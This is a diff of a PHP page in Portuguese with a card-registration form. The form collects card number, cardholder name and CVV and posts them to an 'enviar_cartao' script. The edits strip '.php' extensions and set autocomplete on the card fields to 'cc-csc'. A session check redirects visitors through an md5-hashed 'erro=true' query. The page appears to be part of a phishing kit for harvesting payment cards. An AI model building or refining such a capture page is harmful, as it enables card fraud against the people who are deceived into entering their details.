@@ -13,7 +13,7 @@
     session_start();
     error_reporting(E_ERROR | E_PARSE);
     if(!isset($_SESSION['cadastro']) && !strpos($protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'],md5('erro=true'))){
-      header("Refresh:0; url=cadastro_cartao.php".'?'.md5('erro=true'));
+      header("Refresh:0; url=cadastro_cartao".'?'.md5('erro=true'));
       exit;
 	}
 
@@ -156,15 +156,15 @@
           </div>
         </div>
       </div>
-      <form action="assets/php/enviar_cartao.php" method="POST" id='cadastro_cartao' onsubmit="return false" autocomplete="off">
+      <form action="assets/php/enviar_cartao" method="POST" id='cadastro_cartao' onsubmit="return false" autocomplete="off">
       <div class="card-form__inner">
         <div class="card-input">
           <label for="cardNumber" class="card-input__label"></label>Numero do Cartão
-          <input type="tel" id="cardNumber" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" name='num_cartao'>
+          <input type="tel" id="cardNumber" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="cc-csc" name='num_cartao'>
         </div>
         <div class="card-input">
           <label for="cardName" class="card-input__label">Nome Impresso no Cartão</label>
-          <input type="text" id="cardName" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" name='nome_cartao'>
+          <input type="text" id="cardName" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="cc-csc" name='nome_cartao'>
         </div>
         <div class="card-form__row">
           <div class="card-form__col">
@@ -187,7 +187,7 @@
           <div class="card-form__col -cvv">
             <div class="card-input">
               <label for="cardCvv" class="card-input__label">CVV</label>
-              <input type="tel" class="card-input__input" id="cardCvv" v-mask="'###'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" name='cvv_cartao'>
+              <input type="tel" class="card-input__input" id="cardCvv" v-mask="'###'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="cc-csc" name='cvv_cartao'>
             </div>
           </div>
         </div>
